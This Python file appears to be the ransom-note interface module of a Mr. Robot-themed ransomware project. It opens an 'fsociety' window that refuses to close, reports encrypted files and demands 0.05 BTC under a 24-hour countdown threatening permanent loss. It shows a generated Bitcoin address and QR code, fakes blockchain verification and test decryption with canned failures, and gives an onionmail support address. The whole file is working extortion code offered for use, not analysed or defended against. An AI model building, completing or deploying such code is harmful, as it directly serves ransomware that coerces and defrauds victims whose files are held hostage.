"""
Interface Integration Module
Controls the ransom interface launch and closure - FIXED FILE PATH VERSION
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext
from PIL import Image, ImageTk
import random
import pygame
import hashlib
import time
import secrets
import qrcode
from io import BytesIO
import threading
import sys
import os

# Get the directory where the script is located
if getattr(sys, 'frozen', False):
    # If running as compiled executable
    BASE_DIR = os.path.dirname(sys.executable)
else:
    # If running as script
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

print(f"[INTERFACE] Base directory: {BASE_DIR}")

class MrRobotUI:
    def __init__(self, root, encrypted_count=583):
        self.root = root
        self.encrypted_count = encrypted_count
        self.root.title(f"fsociety - {encrypted_count} Files Encrypted")
        self.root.geometry("1024x680")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        
        # Center window on screen
        self.root.update_idletasks()
        width = 1024
        height = 680
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
        # Force window to be on top
        self.root.attributes('-topmost', True)
        self.root.focus_force()
        self.root.after(100, lambda: self.root.attributes('-topmost', False))
        
        self.btc_address = None
        self.btc_amount = 0.05
        self.usd_amount = 1500
        self.payment_confirmed = False
        
        # Initialize pygame mixer
        try:
            pygame.mixer.init()
            self.play_bg_music()
        except Exception as e:
            print(f"[INTERFACE] Pygame init error: {e}")

        self.center_x = 0.795
        self.timer_y = 0.7
        self.btn_y = 0.86

        # Try to load background image with multiple possible locations
        bg_loaded = False
        bg_paths = [
            os.path.join(BASE_DIR, "mrrobot2.png"),
            os.path.join(BASE_DIR, "resources", "mrrobot2.png"),
            "mrrobot2.png",
            os.path.join(os.getcwd(), "mrrobot2.png")
        ]
        
        for bg_path in bg_paths:
            try:
                if os.path.exists(bg_path):
                    print(f"[INTERFACE] Loading background from: {bg_path}")
                    self.bg_image = Image.open(bg_path)
                    bg_loaded = True
                    break
            except Exception as e:
                print(f"[INTERFACE] Error loading {bg_path}: {e}")
        
        if bg_loaded:
            try:
                self.bg_photo = ImageTk.PhotoImage(self.bg_image)
                self.bg_label = tk.Label(root, image=self.bg_photo)
                self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
                print("[INTERFACE] Background image loaded successfully")
            except Exception as e:
                print(f"[INTERFACE] Error displaying background: {e}")
                self.create_fallback_background()
        else:
            print("[INTERFACE] Background image not found, creating fallback")
            self.create_fallback_background()

        # Encrypted files count - USE ACTUAL COUNT
        self.encrypted_label = tk.Label(root, 
            text=f"{self.encrypted_count} FILES ENCRYPTED (.MrRobot)", 
            font=("Consolas", 12, "bold"), 
            fg="#ff5555", bg="#0a0a0a")
        self.encrypted_label.place(relx=self.center_x, rely=0.55, anchor="center")

        # Warning text
        self.warning_label = tk.Label(root, 
            text=f"YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE AES-256 ENCRYPTION\n\nTO RECOVER YOUR DATA, YOU MUST PAY {self.btc_amount} BTC (~${self.usd_amount} USD)\n\nFAILURE TO PAY WITHIN 24 HOURS WILL PERMANENTLY DESTROY YOUR DECRYPTION KEY", 
            font=("Consolas", 10, "bold"), 
            fg="#ff0000", bg="#0a0a0a", 
            wraplength=350, justify="center")
        self.warning_label.place(relx=self.center_x, rely=0.62, anchor="center")

        # Timer
        self.time_left = 86400  # 24 hours
        self.timer_label = tk.Label(root, text="", font=("Courier", 42, "bold"), 
                                    fg="#ff0000", bg="#0a0a0a", bd=0)
        self.timer_label.place(relx=self.center_x, rely=self.timer_y, anchor="center")
        self.update_timer()

        # Payment button with glow effect
        self.glow_frame = tk.Frame(root, bg="#ff0000", padx=2, pady=2)
        self.glow_frame.place(relx=self.center_x, rely=self.btn_y, anchor="center")

        self.pay_btn = tk.Button(self.glow_frame, 
                                 text="  INITIALIZE PAYMENT & GET BITCOIN ADDRESS  ", 
                                 command=self.generate_payment_screen,
                                 font=("Courier New", 12, "bold"),
                                 fg="#ff0000", bg="#1a0000",
                                 activeforeground="#ffffff", activebackground="#ff0000",
                                 relief="raised", 
                                 borderwidth=5,
                                 cursor="hand2",
                                 width=35)
        self.pay_btn.pack()

        self.pay_btn.bind("<Enter>", self.on_enter)
        self.pay_btn.bind("<Leave>", self.on_leave)
        
        # Test decryption button
        self.test_btn = tk.Button(root,
                                 text="TEST DECRYPTION (1 FILE)",
                                 command=self.test_decryption,
                                 font=("Courier", 9),
                                 fg="#00ff00", bg="#002200",
                                 cursor="hand2")
        self.test_btn.place(relx=0.795, rely=0.92, anchor="center")
        
        # Apply glitch effect
        self.apply_glitch()
        
        print(f"[INTERFACE] Window created with {encrypted_count} encrypted files")
    
    def create_fallback_background(self):
        """Create a fallback background if image can't be loaded"""
        self.root.configure(bg="#050505")
        
        # Create a canvas for drawing
        canvas = tk.Canvas(self.root, width=1024, height=680, bg="#050505", highlightthickness=0)
        canvas.place(x=0, y=0)
        
        # Draw fsociety logo
        canvas.create_text(512, 120, text="fsociety", 
                          font=("Courier", 72, "bold"), 
                          fill="#ff0000")
        
        # Draw encrypted count
        canvas.create_text(512, 220, 
                          text=f"{self.encrypted_count} FILES ENCRYPTED", 
                          font=("Courier", 24), 
                          fill="#ff5555")
        
        # Draw warning box
        canvas.create_rectangle(300, 300, 724, 500, outline="#ff0000", width=2)
        
        # Store canvas reference
        self.canvas = canvas

    def disable_close(self):
        """Prevent window from closing"""
        messagebox.showerror("ACCESS DENIED", "Cannot close window until payment is completed.")

    def generate_btc_wallet(self):
        """Generate a unique Bitcoin address"""
        import uuid
        system_id = str(uuid.getnode()) + str(time.time())
        hash_obj = hashlib.sha256(system_id.encode())
        btc_hash = hash_obj.hexdigest()[:40]
        self.btc_address = "1" + btc_hash[:33]
        return self.btc_address

    def generate_payment_screen(self):
        """Display payment information"""
        if not self.btc_address:
            self.btc_address = self.generate_btc_wallet()
        
        payment_window = tk.Toplevel(self.root)
        payment_window.title("Payment Instructions - fsociety")
        payment_window.geometry("600x700")
        payment_window.resizable(False, False)
        payment_window.configure(bg="#0a0a0a")
        payment_window.grab_set()
        
        # Center payment window
        payment_window.update_idletasks()
        width = 600
        height = 700
        x = (payment_window.winfo_screenwidth() // 2) - (width // 2)
        y = (payment_window.winfo_screenheight() // 2) - (height // 2)
        payment_window.geometry(f'{width}x{height}+{x}+{y}')
        
        title = tk.Label(payment_window, 
                        text="BITCOIN PAYMENT INSTRUCTIONS",
                        font=("Courier", 16, "bold"),
                        fg="#ff0000", bg="#0a0a0a")
        title.pack(pady=10)
        
        amount_frame = tk.Frame(payment_window, bg="#0a0a0a")
        amount_frame.pack(pady=5)
        
        tk.Label(amount_frame, 
                text="AMOUNT DUE:", 
                font=("Courier", 12, "bold"),
                fg="#ffffff", bg="#0a0a0a").pack()
        
        tk.Label(amount_frame, 
                text=f"{self.btc_amount} BTC (≈ ${self.usd_amount} USD)", 
                font=("Courier", 14, "bold"),
                fg="#ffff00", bg="#0a0a0a").pack()
        
        addr_frame = tk.Frame(payment_window, bg="#0a0a0a")
        addr_frame.pack(pady=10)
        
        tk.Label(addr_frame, 
                text="SEND PAYMENT TO:", 
                font=("Courier", 10),
                fg="#ffffff", bg="#0a0a0a").pack()
        
        addr_text = tk.Text(addr_frame, 
                          height=3, 
                          width=50,
                          font=("Courier", 9),
                          fg="#00ff00", 
                          bg="#001100",
                          relief="sunken",
                          wrap="word")
        addr_text.insert("1.0", self.btc_address)
        addr_text.configure(state="disabled")
        addr_text.pack(pady=5)
        
        copy_btn = tk.Button(addr_frame,
                           text="COPY ADDRESS TO CLIPBOARD",
                           command=lambda: self.copy_to_clipboard(self.btc_address),
                           font=("Courier", 8),
                           fg="#ffffff", bg="#006600")
        copy_btn.pack()
        
        # Generate QR code
        try:
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=8,
                border=2,
            )
            btc_uri = f"bitcoin:{self.btc_address}?amount={self.btc_amount}&label=fsociety_ransom"
            qr.add_data(btc_uri)
            qr.make(fit=True)
            
            qr_img = qr.make_image(fill_color="#ff0000", back_color="#0a0a0a")
            
            qr_photo = ImageTk.PhotoImage(qr_img)
            
            qr_label = tk.Label(payment_window, image=qr_photo, bg="#0a0a0a")
            qr_label.image = qr_photo  # Keep reference
            qr_label.pack(pady=10)
            
            qr_text = tk.Label(payment_window,
                             text="SCAN QR CODE WITH BITCOIN WALLET",
                             font=("Courier", 9),
                             fg="#aaaaaa", bg="#0a0a0a")
            qr_text.pack()
        except Exception as e:
            print(f"[INTERFACE] QR code error: {e}")
            # Show address as text if QR fails
            tk.Label(payment_window,
                   text=f"Bitcoin: {self.btc_address}",
                   font=("Courier", 9),
                   fg="#00ff00", bg="#0a0a0a").pack(pady=10)
        
        instructions = tk.Label(payment_window,
                              text=f"""PAYMENT INSTRUCTIONS:
1. Send EXACTLY {self.btc_amount} BTC to the address above
2. Wait for 3 network confirmations
3. Click 'VERIFY PAYMENT' below
4. Decryption key will be sent automatically

IMPORTANT:
• Payments under {self.btc_amount} BTC will be ignored
• Do not send from exchanges (use personal wallet)
• Transaction fees are your responsibility""",
                              font=("Courier", 8),
                              fg="#cccccc", bg="#0a0a0a",
                              justify="left")
        instructions.pack(pady=10)
        
        verify_frame = tk.Frame(payment_window, bg="#0a0a0a")
        verify_frame.pack(pady=10)
        
        verify_btn = tk.Button(verify_frame,
                             text="VERIFY PAYMENT ON BLOCKCHAIN",
                             command=lambda: self.check_payment(payment_window),
                             font=("Courier", 10, "bold"),
                             fg="#ffffff", bg="#006600",
                             width=30)
        verify_btn.pack()
        
        # Close button
        close_btn = tk.Button(payment_window,
                            text="CLOSE",
                            command=payment_window.destroy,
                            font=("Courier", 10),
                            fg="#ffffff", bg="#333333")
        close_btn.pack(pady=10)
        
        support = tk.Label(payment_window,
                         text="If payment fails: Email fsociety_help@onionmail.org",
                         font=("Courier", 7),
                         fg="#555555", bg="#0a0a0a")
        support.pack(pady=5)

    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        messagebox.showinfo("Copied", "Bitcoin address copied to clipboard.")

    def check_payment(self, window):
        """Check if payment was made"""
        response = messagebox.askyesno(
            "Payment Verification",
            "This will connect to Bitcoin blockchain to verify payment.\n\nContinue?"
        )
        
        if response:
            self.pay_btn.config(state="disabled", text="CHECKING BLOCKCHAIN...")
            window.after(2000, lambda: self.payment_result(window))

    def payment_result(self, window):
        """Show payment verification result"""
        result = random.choice([
            "No payment detected. Send EXACTLY 0.05 BTC.",
            "Transaction not found. Ensure you sent 0.05 BTC.",
            "Insufficient amount received. Send 0.05 BTC.",
            "Payment detected but needs more confirmations."
        ])
        
        messagebox.showwarning("Payment Status", result)
        self.pay_btn.config(state="normal", text="  INITIALIZE PAYMENT & GET BITCOIN ADDRESS  ")

    def test_decryption(self):
        """Fake decryption test"""
        result = random.choice([
            "TEST FAILED: Payment required for decryption.",
            "Decryption key not available. Payment required.",
            "Cannot decrypt without valid payment.",
            "Your files remain encrypted. Payment is mandatory."
        ])
        messagebox.showerror("Decryption Failed", result)

    def play_bg_music(self):
        """Play background music"""
        try:
            # Try multiple possible locations for the audio file
            audio_paths = [
                os.path.join(BASE_DIR, "mrrobot_sound.mp3"),
                os.path.join(BASE_DIR, "resources", "mrrobot_sound.mp3"),
                "mrrobot_sound.mp3",
                os.path.join(os.getcwd(), "mrrobot_sound.mp3")
            ]
            
            audio_loaded = False
            for audio_path in audio_paths:
                if os.path.exists(audio_path):
                    print(f"[INTERFACE] Loading audio from: {audio_path}")
                    pygame.mixer.music.load(audio_path)
                    pygame.mixer.music.play(-1)  # Loop forever
                    audio_loaded = True
                    print("[INTERFACE] Playing background music")
                    break
            
            if not audio_loaded:
                print("[INTERFACE] Audio file not found in any location")
                
        except Exception as e:
            print(f"[INTERFACE] Music error: {e}")

    def on_enter(self, e):
        """Button hover effect - enter"""
        self.pay_btn.config(bg="#ff0000", fg="#ffffff")
        self.glow_frame.config(bg="#ffffff")

    def on_leave(self, e):
        """Button hover effect - leave"""
        self.pay_btn.config(bg="#1a0000", fg="#ff0000")
        self.glow_frame.config(bg="#ff0000")

    def update_timer(self):
        """Update countdown timer"""
        hours, remainder = divmod(self.time_left, 3600)
        mins, secs = divmod(remainder, 60)
        self.timer_label.config(text=f"{hours:02}:{mins:02}:{secs:02}")
        
        if self.time_left > 0:
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="TIME EXPIRED", fg="#990000")
            self.warning_label.config(text="DECRYPTION KEY DESTROYED\n\nYOUR FILES ARE PERMANENTLY LOST")
            self.pay_btn.config(state="disabled", text="PAYMENT WINDOW CLOSED")

    def apply_glitch(self):
        """Apply random glitch effects"""
        if random.random() > 0.90:
            # Random glitch: move timer slightly
            self.timer_label.place_configure(relx=self.center_x + random.uniform(-0.01, 0.01))
            self.pay_btn.config(fg="#ffffff")
        else:
            # Return to normal position
            self.timer_label.place_configure(relx=self.center_x)
            if self.pay_btn['bg'] != "#ff0000":  # Only change if not hovered
                self.pay_btn.config(fg="#ff0000")
                
        # Schedule next glitch
        self.root.after(random.randint(100, 500), self.apply_glitch)

# Global interface instance
_interface_instance = None
_interface_thread = None

def start_interface(encrypted_count=583):
    """Start the ransom interface - MAIN FUNCTION"""
    global _interface_instance, _interface_thread
    
    def run_interface():
        global _interface_instance
        try:
            print(f"[INTERFACE] Creating Tkinter window with {encrypted_count} files")
            root = tk.Tk()
            _interface_instance = MrRobotUI(root, encrypted_count)
            print("[INTERFACE] Starting mainloop...")
            root.mainloop()  # This blocks until window is closed
            print("[INTERFACE] Mainloop ended")
        except Exception as e:
            print(f"[INTERFACE] Error in run_interface: {e}")
            import traceback
            traceback.print_exc()
    
    # Check if interface is already open
    if is_interface_open():
        print("[INTERFACE] Interface is already open")
        return False
    
    # Create and start thread
    print("[INTERFACE] Creating interface thread...")
    _interface_thread = threading.Thread(target=run_interface)
    _interface_thread.daemon = False  # NON-DAEMON - CRITICAL!
    _interface_thread.start()
    
    # Wait for interface to initialize
    print("[INTERFACE] Waiting for interface to initialize...")
    time.sleep(3)  # Give time for window to appear
    
    return True

def start_interface_with_count(encrypted_count):
    """Start interface with specific encrypted count"""
    return start_interface(encrypted_count)

def close_interface():
    """Close the ransom interface"""
    global _interface_instance
    
    if _interface_instance:
        try:
            print("[INTERFACE] Closing interface...")
            _interface_instance.root.quit()
            _interface_instance.root.destroy()
            _interface_instance = None
            print("[INTERFACE] Interface closed successfully")
            return True
        except Exception as e:
            print(f"[INTERFACE] Error closing interface: {e}")
            pass
    
    return False

def is_interface_open():
    """Check if interface is open"""
    global _interface_instance
    return _interface_instance is not None

# TEST FUNCTION - Add this to run interface directly
def test_interface():
    """Test function to run interface directly"""
    print("=== TESTING INTERFACE ===")
    print("Creating interface with 583 encrypted files...")
    
    # Create and run interface in main thread (not in separate thread)
    root = tk.Tk()
    app = MrRobotUI(root, 583)
    print("Interface created. Starting mainloop...")
    root.mainloop()
    print("Interface closed.")

# ADD THIS AT THE BOTTOM OF THE FILE:
if __name__ == "__main__":
    # When run directly, test the interface
    print("Running interface_integration.py directly")
    print("To test: This will create a window with 583 encrypted files")
    
    # Ask user for encrypted count
    try:
        count = input("Enter number of encrypted files [default: 583]: ").strip()
        if count:
            encrypted_count = int(count)
        else:
            encrypted_count = 583
    except:
        encrypted_count = 583
    
    print(f"Launching interface with {encrypted_count} encrypted files...")
    
    # Run interface in main thread (not threaded for testing)
    root = tk.Tk()
    app = MrRobotUI(root, encrypted_count)
    print("Interface window created. Press Ctrl+C in terminal to exit.")
    root.mainloop()